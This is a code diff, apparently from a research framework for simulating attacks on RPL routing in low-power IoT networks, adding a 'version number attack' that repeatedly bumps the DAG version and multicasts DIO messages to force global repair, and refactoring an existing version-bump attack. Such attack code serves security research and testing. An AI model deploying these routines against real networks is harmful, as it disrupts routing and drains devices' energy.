@@ -117,6 +117,13 @@ bool network_attacks_rpl_dis_send;
 bool network_attacks_rpl_dag_version_bump;
 
 /*
+ * Version number attack - bump version number to trigger global repair
+ */
+bool network_attacks_rpl_vna = false;
+
+uint8_t vna_bumped_version = 0;
+
+/*
  * DIS Flooding Attack - send multicast DIS periodically and after
  * receiving DIO.
  */
@@ -261,7 +268,31 @@ schedule_dfa(void)
 	     dfa, NULL);
 }
 /*---------------------------------------------------------------------------*/
-
+static void
+rpl_dag_version_bump(void) {
+  rpl_instance_t *instance;
+  instance = rpl_get_default_instance();
+  if(instance == NULL) {
+    LOG_WARN("No RPL instance - can not bump DAG version\n");
+  } else {
+    RPL_LOLLIPOP_INCREMENT(instance->dag.version);
+    vna_bumped_version = instance->dag.version;
+    LOG_INFO("Bump DAG version to %u\n", instance->dag.version);
+  }
+}
+/*---------------------------------------------------------------------------*/
+static void
+version_number_attack(void)
+{
+  rpl_instance_t *instance = rpl_get_default_instance();
+  // dag.version will be different to bumped version if node has rejoined dag
+  if(instance != NULL && (instance->dag.version != vna_bumped_version)) {
+    rpl_dag_version_bump();
+    LOG_INFO("Send multicast DIO\n");
+    rpl_icmp6_dio_output(NULL);
+  }
+}
+/*---------------------------------------------------------------------------*/
 static void
 change_of(void) {
   //rpl_dag_t *dag = rpl_get_any_dag(addr);
@@ -313,6 +344,10 @@ check_config(void *ptr)
     ctimer_set(&dfa_timer, CLOCK_SECOND / 2, dfa, NULL);
   }
 
+  if(network_attacks_rpl_vna) {
+     version_number_attack();
+  }
+
   if(network_attacks_worst_parent) {
     change_of();
   }
@@ -331,21 +366,7 @@ check_config(void *ptr)
 
   if(network_attacks_rpl_dag_version_bump) {
     network_attacks_rpl_dag_version_bump = false;
-#if ROUTING_CONF_RPL_LITE
-    RPL_LOLLIPOP_INCREMENT(curr_instance.dag.version);
-    LOG_INFO("Bump DAG version to %u\n", curr_instance.dag.version);
-#elif ROUTING_CONF_RPL_CLASSIC
-    rpl_instance_t *instance;
-    instance = rpl_get_default_instance();
-    if(instance == NULL) {
-      LOG_WARN("No RPL instance - can not bump DAG version\n");
-    } else {
-      RPL_LOLLIPOP_INCREMENT(instance->dag.version);
-      LOG_INFO("Bump DAG version to %u\n", instance->dag.version);
-    }
-#else
-    LOG_WARN("Not using RPL - can not bump DAG version\n");
-#endif
+    rpl_dag_version_bump();
   }
 
   if(network_attacks_rpl_dio_reset) {
